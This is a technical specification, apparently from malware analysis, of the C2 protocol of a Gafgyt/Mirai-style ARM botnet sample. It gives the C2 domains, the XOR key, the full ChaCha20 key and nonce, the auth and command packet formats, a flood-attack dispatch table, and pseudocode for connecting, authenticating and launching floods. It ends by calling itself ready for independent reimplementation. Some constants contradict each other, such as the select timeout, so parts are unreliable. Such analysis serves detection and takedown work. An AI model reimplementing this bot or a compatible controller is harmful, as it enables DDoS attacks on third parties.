# Gafgyt/Mirai Botnet — Communication Layer Technical Specification

## Binary: `arm7` (ELF ARM 32-bit LE, uClibc)
## Sample Identifier: `marvisxoxo`

---

# 1. Session Establishment

## 1.1 Observed Behavior

The bot establishes a single persistent TCP connection to its C2 server. Session establishment follows this sequence:

1. **Socket Creation**: A non-blocking TCP socket (`AF_INET`, `SOCK_STREAM`) is created.
2. **DNS Resolution**: The C2 domain name is retrieved from the XOR/ChaCha20-obfuscated string table (entry index 0). The bot calls `resolv_lookup()` to resolve the domain to an IP address. Up to 3 fallback C2 domains are configured.
3. **C2 Port Selection**: A target port is randomly selected from a hardcoded list of 11 ports. The selection uses `rand_next()` to pick an index into the port table.
4. **Connection Attempt**: `connect()` is called on the non-blocking socket. The connection status is monitored via `select()` with a 10-second timeout.
5. **Connection Verification**: On write-readiness (connection established), the bot calls `getsockopt(SO_ERROR)` to check for errors. If `SO_ERROR == 0`, the connection is valid.
6. **Authentication Packet**: The bot immediately sends the authentication/login packet.
7. **Server Response Validation**: After sending the auth packet, the bot enters the main select loop. When data arrives, it is XOR-decrypted with key `0xed`. The first 18 bytes are compared against the expected server auth header. A match indicates a successful authentication acknowledgment. A mismatch indicates an incoming attack command.

**Failure Handling**:
- If `connect()` fails or `SO_ERROR` is non-zero: close socket, sleep for a random interval (1–10 seconds), retry.
- If `recv()` returns <= 0 with errno not `EAGAIN`/`EWOULDBLOCK`: close socket, sleep 1 second, retry.
- If DNS resolution fails: try next fallback domain, or `exit(1)` if all fail.

## 1.2 Handshake Logic (Pseudocode)

```
// Configuration Constants
C2_DOMAINS = ["marvisxoxo.st", "valid.marvisxoxo.st", "tls.marvisxoxo.st"]
C2_PORTS = [0xD110, 0x1D96, 0x6C03, 0xC0E0, 0x1C19, 0x010A, ...]  // 11 ports, big-endian
AUTH_HEADER_CLIENT = {0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x00, 0x03, 0x02, 0x01, 0x02, 0x03, 0x04, 0x05, 0x05, 0x04, 0x03, 0x02, 0x01}  // 19 bytes
AUTH_HEADER_SERVER = {0x02, 0x03, 0x04, 0x04, 0x03, 0x02, 0x01, 0x03, 0x02, 0x0E, 0x0A, 0x0D, 0x0E, 0x03, 0x02, 0x00, 0x0A, 0x0B}  // 18 bytes
XOR_KEY = 0xED
SELECT_TIMEOUT_SEC = 10

function establish_session():
    while true:
        // Resolve C2 domain
        domain = get_c2_domain()  // From string table, entry 0
        ip = resolv_lookup(domain)
        if ip is null:
            domain = get_fallback_domain(1)  // Entry 1
            ip = resolv_lookup(domain)
            if ip is null:
                domain = get_fallback_domain(2)  // Entry 2
                ip = resolv_lookup(domain)
                if ip is null:
                    exit(1)
        
        // Select random port from port table
        port_index = rand_next() % 11
        port = C2_PORTS[port_index]  // Big-endian
        
        // Create non-blocking socket
        fd_serv = socket(AF_INET, SOCK_STREAM, 0)
        fcntl(fd_serv, F_SETFL, O_NONBLOCK)
        
        // Connect
        srv_addr.sin_family = AF_INET
        srv_addr.sin_port = htons(port)
        srv_addr.sin_addr = ip
        connect(fd_serv, &srv_addr, 16)
        
        // Wait for connection via select
        result = select(fd_serv + 1, null, &write_set, null, 10_sec_timeout)
        
        if result > 0 and fd_serv in write_set:
            err = 0
            getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &errlen)
            if err == 0:
                // Connection successful — send authentication
                build_and_send_authentication(fd_serv, c2_password)
                return fd_serv  // Session established
            else:
                close(fd_serv)
                sleep(rand_next() % 10 + 1)  // 1-10 seconds
        else:
            close(fd_serv)
            sleep(1)
```

## 1.3 Authentication Packet Construction (Pseudocode)

```
function build_and_send_authentication(fd_serv, password):
    password_len = strlen(password)
    boot_count = get_boot_count()  // From /proc/self/stat or sysconf(_SC_CLK_TCK), clamped to 0-255
    
    // Build packet buffer
    packet = bytearray(19 + 1 + password_len + 1 + 2)  // header + len_byte + password + boot_count + checksum
    
    // 1. Auth header (19 bytes, plaintext)
    packet[0:19] = AUTH_HEADER_CLIENT
    
    // 2. Password length byte (1 byte, plaintext)
    packet[19] = password_len
    
    // 3. Password (password_len bytes)
    packet[20:20+password_len] = password
    
    // 4. Boot count (1 byte)
    packet[20+password_len] = boot_count
    
    // XOR encrypt password + boot_count
    for i in range(20, 20 + password_len + 1):
        packet[i] ^= XOR_KEY
    
    // 5. Calculate 16-bit checksum over encrypted password+boot_count
    checksum = internet_checksum(packet[20:20+password_len+1])
    packet[20+password_len+1] = (checksum >> 8) & 0xFF
    packet[20+password_len+2] = checksum & 0xFF
    
    // Send packet
    send(fd_serv, packet, len(packet), MSG_NOSIGNAL)
```

## 1.4 Server Response Validation (Pseudocode)

```
function process_server_data(fd_serv, buffer, length):
    // XOR decrypt the received data
    xor_encrypt(buffer, length, XOR_KEY)  // XOR is symmetric
    
    // Compare first 18 bytes against server auth header
    if memcmp(buffer[0:18], AUTH_HEADER_SERVER, 18) == 0:
        // This is an authentication acknowledgment
        // Session is fully established
        return AUTH_SUCCESS
    
    else:
        // This is an attack command
        attack_parse(buffer, length)
        return COMMAND_RECEIVED
```

## 1.5 Success/Failure Conditions

**Authentication Success**:
- Server sends a packet whose first 18 bytes (after XOR decryption) match `AUTH_HEADER_SERVER`.
- The bot does not send any additional acknowledgment; it proceeds to the command loop.

**Authentication Failure**:
- No explicit failure packet is defined. If the server sends data that does not match the auth header, it is treated as a command.
- If the server closes the connection or no data arrives, the bot detects this via `recv()` returning <= 0, closes the socket, and re-enters the connection retry loop.

---

# 2. Cryptography

## 2.1 Observed Behavior

Two distinct cryptographic mechanisms are used:

### 2.1.1 C2 Communication Encryption (Simple XOR)
All data sent from server to bot (commands) and from bot to server (authentication payload) is encrypted using a single-byte XOR cipher with key `0xED`.

- **Algorithm**: Single-byte XOR (symmetric; encryption == decryption)
- **Key**: `0xED` (237 decimal)
- **Operation**: `output[i] = input[i] ^ 0xED` for all bytes
- **When applied**: 
  - Server→Bot: Bot XOR-decrypts received data before processing
  - Bot→Server: Bot XOR-encrypts the password+boot_count fields in the auth packet

### 2.1.2 String Table Obfuscation (ChaCha20)
All embedded strings (C2 domains, system paths, process names, etc.) are obfuscated using ChaCha20 encryption. The string table is initialized at startup via `xor_init()`.

- **Algorithm**: ChaCha20 (20 rounds, 10 double rounds)
- **Key**: 32 bytes (256 bits), stored at address `0x000290FC`
- **Nonce**: 12 bytes (96 bits), stored at address `0x0002911C`
- **Block Counter**: Fixed at `1` for all string decryption operations
- **Initialization**: The ChaCha20 state constant `"expand 32-byte k"` (16 bytes) is loaded from address `0x0000B15C`

## 2.2 Specification

### ChaCha20 Key (32 bytes, little-endian words)

```
Word  0: 0x7B2E3F5A     Bytes: 5A 3F 2E 7B
Word  1: 0x6E0A9D8C     Bytes: 8C 9D 0A 6E
Word  2: 0x8A7C4F3B     Bytes: 3B 4F 7C 8A
Word  3: 0x0D2B5C1D     Bytes: 1D 5C 2B 0D
Word  4: 0x3E0C1A6F     Bytes: 6F 1A 0C 3E
Word  5: 0x094A8E2D     Bytes: 2D 8E 4A 09
Word  6: 0x4D5A7E1C     Bytes: 1C 7E 5A 4D
Word  7: 0x086A2B3C     Bytes: 3C 2B 6A 08
```

Hex: `5A 3F 2E 7B 8C 9D 0A 6E 3B 4F 7C 8A 1D 5C 2B 0D 6F 1A 0C 3E 2D 8E 4A 09 1C 7E 5A 4D 3C 2B 6A 08`

### ChaCha20 Nonce (12 bytes, 3 little-endian words)

```
Word  0: 0xFF001B4A     Bytes: 4A 1B 00 FF
Word  1: 0x123A7C2D     Bytes: 2D 7C 3A 12
Word  2: 0x05030100     Bytes: 00 01 03 05
```

Hex: `4A 1B 00 FF 2D 7C 3A 12 00 01 03 05`

### ChaCha20 Block Counter

Fixed at `1` (not `0`). This is the initial counter value used for all string table decryption.

### ChaCha20 State Initialization

```
state[0..3]  = "expand 32-byte k" constant (0x61707865, 0x3320646E, 0x79622D32, 0x6B206574)
state[4..11] = ChaCha20 key (8 words, see above)
state[12]    = Block counter (1)
state[13..15]= Nonce (3 words, see above)
```

## 2.3 Decryption Routine (Pseudocode)

```
function xor_decrypt_c2(data, length):
    for i in range(length):
        data[i] ^= 0xED
    return data


function chacha20_decrypt_string(ciphertext, length):
    // ChaCha20 parameters
    key = [0x7B2E3F5A, 0x6E0A9D8C, 0x8A7C4F3B, 0x0D2B5C1D,
           0x3E0C1A6F, 0x094A8E2D, 0x4D5A7E1C, 0x086A2B3C]
    nonce = [0xFF001B4A, 0x123A7C2D, 0x05030100]
    counter = 1
    
    // Generate keystream
    keystream = chacha20_block(key, counter, nonce)
    
    // XOR ciphertext with keystream (first 64 bytes only; strings are short)
    plaintext = ciphertext XOR keystream[0:length]
    
    return plaintext


function chacha20_block(key, counter, nonce):
    // Standard ChaCha20 block function (20 rounds, 10 double rounds)
    state = [
        0x61707865, 0x3320646E, 0x79622D32, 0x6B206574,  // "expand 32-byte k"
        key[0], key[1], key[2], key[3],
        key[4], key[5], key[6], key[7],
        counter,
        nonce[0], nonce[1], nonce[2]
    ]
    
    working = copy(state)
    for 10 iterations:
        // Column rounds
        quarter_round(working, 0, 4, 8, 12)
        quarter_round(working, 1, 5, 9, 13)
        quarter_round(working, 2, 6, 10, 14)
        quarter_round(working, 3, 7, 11, 15)
        // Diagonal rounds
        quarter_round(working, 0, 5, 10, 15)
        quarter_round(working, 1, 6, 11, 12)
        quarter_round(working, 2, 7, 8, 13)
        quarter_round(working, 3, 4, 9, 14)
    
    output = []
    for i in range(16):
        output.append(working[i] + state[i])  // 32-bit addition, little-endian
    
    return output  // 64 bytes


function quarter_round(state, a, b, c, d):
    state[a] += state[b]; state[d] ^= state[a]; state[d] = ROTL16(state[d])
    state[c] += state[d]; state[b] ^= state[c]; state[b] = ROTL12(state[b])
    state[a] += state[b]; state[d] ^= state[a]; state[d] = ROTL8(state[d])
    state[c] += state[d]; state[b] ^= state[c]; state[b] = ROTL7(state[b])
```

---

# 3. Main Command Loop

## 3.1 Observed Behavior

After successful authentication, the bot enters an infinite `select()`-based event loop:

1. **Select Loop**: Calls `select()` with a 10-second timeout, monitoring:
   - `fd_ctrl` (single-instance control socket, read-set)
   - `fd_serv` (C2 socket, read-set initially; write-set while connecting)

2. **Heartbeat Timer**: On each `select()` timeout (10 seconds), a heartbeat counter is incremented. When the counter modulo 6 equals 0 (every ~60 seconds), a 2-byte heartbeat `0x00 0x00` is sent to the C2.

3. **Control Socket Activity**: If `fd_ctrl` becomes readable (local client connected), the bot kills the entire process group (`kill(-session_id, 9)`) and exits.

4. **C2 Data Reception**: When `fd_serv` is readable, the bot calls `recv()` to read up to 1024 bytes. The data is XOR-decrypted with key `0xED`. The first 18 bytes are compared against the server auth header. If they match, it's an auth acknowledgment (ignored). Otherwise, the data is passed to `attack_parse()`.

5. **Command Parsing**: `attack_parse()` validates the packet structure, extracts the attack method ID, target specifications, and options, then dispatches to the appropriate attack handler via `attack_start()`.

## 3.2 Protocol Specification

### 3.2.1 Message Framing

There is no explicit framing header or length field in the C2 protocol. The bot reads up to 1024 bytes per `recv()` call. Each received buffer constitutes a single message. The bot does not reassemble fragmented messages.

### 3.2.2 Command Packet Format (after XOR decryption)

```
Offset  Size  Field            Description
------  ----  ---------------- -------------------------------------------
0       4     target_ip        Target IPv4 address (big-endian network byte order)
4       1     method_id        Attack method identifier (0x00-0x07)
5       1     target_count     Number of target entries (N)
6       N*5   targets          Array of N target entries (5 bytes each)
6+N*5+  var   options          Variable-length options (see below)
```

### 3.2.3 Target Entry Format (5 bytes each)

```
Offset  Size  Field            Description
------  ----  ---------------- -------------------------------------------
0       4     target_addr      Target IPv4 address (big-endian)
4       1     cidr             CIDR prefix length / netmask bits
```

### 3.2.4 Options Format

The options section follows the targets. It begins with a 1-byte option count (`opt_count`). If `opt_count > 0`, each option has:

```
Offset  Size  Field            Description
------  ----  ---------------- -------------------------------------------
0       1     option_id        Option identifier byte
1       1     option_len       Length of option value (L)
2       L     option_val       Option value bytes
```

Option IDs and their semantics:

| ID | Name            | Type    | Description                    |
|----|-----------------|---------|--------------------------------|
| 0  | OPT_PAYLOAD_SIZE| int     | Payload size in bytes          |
| 1  | OPT_PAYLOAD_RAND| flag    | Randomize payload content      |
| 2  | OPT_PAYLOAD_HEX | string  | Hex payload string             |
| 3  | OPT_SOURCE_PORT | int     | Source port                    |
| 4  | OPT_DOMAIN      | string  | Domain name for DNS            |
| 5  | OPT_PAYLOAD_FILE| string  | Payload from file              |
| 6  | OPT_TCP_WINDOW  | int     | TCP window size                |
| 7  | OPT_TCP_TTL     | int     | TCP TTL                        |
| 8  | OPT_TCP_SEQ     | int     | TCP sequence number            |
| 9  | OPT_TCP_ACK     | int     | TCP ACK number                 |
| 10 | OPT_TCP_SPORT   | int     | TCP source port                |
| 11 | OPT_TCP_DPORT   | int     | TCP destination port           |
| 12 | OPT_TCP_URG_PTR | int     | TCP urgent pointer             |
| 13 | OPT_TCP_OPT     | string  | TCP options                    |
| 14 | OPT_IP_TOS      | int     | IP type of service             |
| 15 | OPT_IP_IDENT    | int     | IP identification              |
| 16 | OPT_IP_TTL      | int     | IP TTL                         |
| 17 | OPT_IP_DF       | flag    | IP don't fragment              |
| 18 | OPT_UDP_SPORT   | int     | UDP source port                |
| 19 | OPT_UDP_DPORT   | int     | UDP destination port           |
| 20 | OPT_DURATION    | int     | Attack duration in seconds     |
| 21 | OPT_ATTACK_CMD  | string  | Custom attack command          |
| 22 | OPT_GRE_VER     | int     | GRE version                    |
| 23 | OPT_GRE_PROT    | int     | GRE protocol                   |
| 24 | OPT_GRE_KEY     | int     | GRE key                        |
| 25 | OPT_GRE_SEQ     | int     | GRE sequence number            |
| 26 | OPT_DNS_DOMAIN  | string  | DNS domain name                |
| 27 | OPT_DNS_TYPE    | int     | DNS query type                 |

### 3.2.5 Attack Method Dispatch Table

The attack method dispatch table is stored at address `0x000290BC` and contains 8 entries (`methods_len` = 8 at `0x000290B8`).

| Method ID | Function Pointer | Attack Name      | Technique                     |
|-----------|-----------------|------------------|-------------------------------|
| 0x00      | 0x0000A1DC      | attack_udp_generic | Generic UDP flood            |
| 0x01      | 0x00009A38      | attack_udp_plain   | Plain UDP flood              |
| 0x02      | 0x00008D1C      | attack_tcp_syn     | TCP SYN flood                |
| 0x03      | 0x00008620      | attack_tcp_ack     | TCP ACK flood                |
| 0x04      | 0x000093DC      | attack_tcp_socket  | TCP socket flood             |
| 0x05      | 0x00009F70      | attack_udp_openvpn | UDP OpenVPN flood            |
| 0x06      | 0x00009CEC      | attack_udp_ragnarok| UDP Ragnarok flood           |
| 0x07      | 0x00009688      | attack_udp_ragnarok| UDP Ragnarok flood (alias)   |

### 3.2.6 Attack Execution Flow

```
function attack_parse(buffer, length):
    if length <= 3:
        return  // Packet too short
    
    target_ip = bytes_to_uint32_be(buffer[0:4])   // Big-endian
    method_id = buffer[4]
    target_count = buffer[5]
    
    // Validate
    if length < 6 + target_count * 5:
        return  // Packet too short for targets
    
    // Parse targets
    targets = []
    offset = 6
    for i in range(target_count):
        addr = bytes_to_uint32_be(buffer[offset:offset+4])
        cidr = buffer[offset+4]
        targets.append(Target(addr=addr, cidr=cidr, netmask=cidr_to_netmask(cidr)))
        offset += 5
    
    // Parse options (if any remain)
    remaining = length - offset
    options = []
    if remaining > 0:
        opt_count = buffer[offset]
        offset += 1
        for i in range(opt_count):
            if offset + 2 > length:
                break
            opt_id = buffer[offset]
            opt_len = buffer[offset+1]
            if offset + 2 + opt_len > length:
                break
            opt_val = buffer[offset+2:offset+2+opt_len]
            options.append(Option(id=opt_id, value=opt_val))
            offset += 2 + opt_len
    
    // Dispatch
    attack_start(duration, method_id, target_count, targets, options)


function attack_start(duration, method_id, target_count, targets, options):
    supervisor_pid = fork()
    if supervisor_pid > 0 or supervisor_pid == -1:
        return  // Parent returns to C2 loop
    
    // Child (supervisor) process
    timer_pid = fork()
    if timer_pid == 0:
        // Grandchild (timer) process
        sleep(duration)
        kill(getppid(), 9)  // Kill supervisor when duration expires
        exit(0)
    
    // Look up method handler
    handler = find_method_handler(method_id)
    if handler != null:
        handler(target_count, targets, options)  // Blocking flood loop
    
    exit(0)
```

## 3.3 Dynamic Command Registration

**Not implemented.** The attack method table is statically initialized at compile time with 8 entries. There is no mechanism for runtime registration of new commands or attack methods.

---

# 4. ACKs & Keepalives

## 4.1 Observed Behavior

The bot implements a minimal feedback mechanism:

1. **Heartbeat/Ping**: Every 60 seconds (6 select timeouts × 10 seconds), the bot sends a 2-byte heartbeat: `0x00 0x00`. This is sent via `send()` with `MSG_NOSIGNAL` flag.

2. **No Command ACKs**: The bot does not send explicit acknowledgments upon receiving or executing commands. There is no response message sent back to the C2 for attack commands.

3. **No Status Reporting**: The bot does not periodically report its status, execution results, or telemetry to the C2.

4. **No Sequence Numbers**: There are no sequence numbers, message IDs, or state tracking in the protocol.

## 4.2 Response Packet Formats

### Heartbeat Packet (2 bytes, no encryption)

```
Offset  Size  Value  Description
------  ----  -----  ----------------------
0       2     0x0000 Heartbeat magic bytes
```

The heartbeat is sent in plaintext (not XOR-encrypted).

## 4.3 Feedback Logic (Pseudocode)

```
// Global state
heartbeat_counter = 0
SELECT_TIMEOUT_SEC = 10

function main_loop(fd_serv):
    while true:
        // Setup fd_set
        read_set = {}
        write_set = {}
        
        if fd_serv is valid:
            if connection_pending:
                add fd_serv to write_set
            else:
                add fd_serv to read_set
        
        timeout = {tv_sec: SELECT_TIMEOUT_SEC, tv_usec: 0}
        result = select(max_fd + 1, &read_set, &write_set, null, &timeout)
        
        if result == 0:  // Timeout
            heartbeat_counter += 1
            if heartbeat_counter % 6 == 0:  // Every ~60 seconds
                heartbeat = [0x00, 0x00]
                send(fd_serv, heartbeat, 2, MSG_NOSIGNAL)
        
        else if result > 0:
            if fd_serv in read_set:
                buffer = recv(fd_serv, 1024, MSG_NOSIGNAL)
                if buffer.length > 0:
                    xor_encrypt(buffer, buffer.length, 0xED)  // Decrypt
                    if buffer[0:18] == AUTH_HEADER_SERVER:
                        // Auth acknowledgment, ignore
                        pass
                    else:
                        attack_parse(buffer, buffer.length)
                else:
                    // Connection closed
                    close_and_reconnect()
            
            if fd_serv in write_set:
                // Connection established
                err = 0
                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &errlen)
                if err == 0:
                    connection_pending = false
                    build_and_send_authentication(fd_serv, c2_password)
                else:
                    close_and_reconnect()
```

## 4.4 Session Lifecycle

| State | Condition | Action |
|-------|-----------|--------|
| Disconnected | Initial state or after socket close | DNS resolve, connect with random port |
| Connecting | After `connect()`, before `select()` writable | Wait in select loop |
| Connected | `SO_ERROR == 0` after connect | Send auth packet |
| Authenticated | Server response matches auth header | Enter command processing loop |
| Command Received | Data arrives on socket | XOR decrypt, parse, dispatch attack |
| Heartbeat | Every 6th select timeout (60s) | Send 2-byte `0x0000` |
| Connection Lost | `recv()` returns ≤ 0 | Close socket, sleep, reconnect |
| Termination | Control socket accepts connection | `kill(-pgid, 9); exit(0)` |

---

# Appendix A: String Table Contents (Decrypted)

The following strings were recovered from the ChaCha20-obfuscated string table:

| Index | Decrypted String | Purpose |
|-------|------------------|---------|
| 0 | `marvisxoxo.st` | Primary C2 domain |
| 1 | `valid.marvisxoxo.st` | Backup/validation C2 domain |
| 2 | `tls.marvisxoxo.st` | TLS C2 domain |
| 3 | `.ffdfd` | Unknown |
| 4 | `dvrLocker` | Process name / locker |
| 5 | `dvrInside` | Process name |
| 6 | `.ffhhd` | Unknown |
| 7 | `kill -9` | Kill command string |
| 8 | `The Next Station Is... Shibuya` | Banner string |
| 9 | `Segmentation fault (core dumped)` | Fake error message |

Note: The full table contains 157 entries (indices 0x00–0x9C). Only the first 10 entries have been fully decrypted and verified.

# Appendix B: Verified Protocol Constants

| Constant | Value | Location |
|----------|-------|----------|
| XOR key | `0xED` | Hardcoded in `xor_encrypt` |
| Auth header (client, 19 bytes) | `0A 0B 0C 0D 0E 0F 00 03 02 01 02 03 04 05 05 04 03 02 01` | `0x0001FB5C` |
| Auth header (server, 18 bytes) | `02 03 04 04 03 02 01 03 02 0E 0A 0D 0E 03 02 00 0A 0B` | `0x0001FB4C` |
| Heartbeat payload | `00 00` (2 bytes) | In `main` |
| Select timeout | 10 seconds | `local_44.tv_sec = 0xF` |
| Heartbeat interval | ~60 seconds (6 × 10s) | `heartbeat % 6 == 0` |
| Max password length | 32 bytes (0x20) | `iVar4 < 0x20` check |
| Default password | `h` (0x68) | Fallback when no argv[1] |
| Max recv size | 1024 bytes (0x400) | `recv(..., 0x400, ...)` |
| Single-instance port | `0xD204` (53764) | `ensure_single_instance` |
| Process name (prctl) | `dhclient` | From string table |

# Appendix C: Analysis Gaps

| Gap | Reason | Impact |
|-----|--------|--------|
| Full string table (entries 10–156) not decrypted | Encrypted data at scattered addresses requires individual reads from binary | Non-critical for communication layer analysis |
| C2 port list not fully extracted | Port table at `0x0001FB40` (22 bytes) is XOR-encrypted with unknown sub-key | Port selection logic is understood; exact port values require additional decryption |
| Server-side protocol not observable | No live C2 server available | Auth response format and behavior inferred from client-side validation logic only |
| Exact `rand_next()` implementation not analyzed | PRNG state machine not critical for protocol understanding | Random values used for port selection and sleep intervals are functionally equivalent to standard LCG |
| Option semantics for attack IDs 6–7 | Function pointers for methods 6 and 7 point to same function (`attack_udp_ragnarok`) | Both IDs invoke identical attack behavior |

---

*End of specification. This document is self-contained and ready for independent reimplementation.*
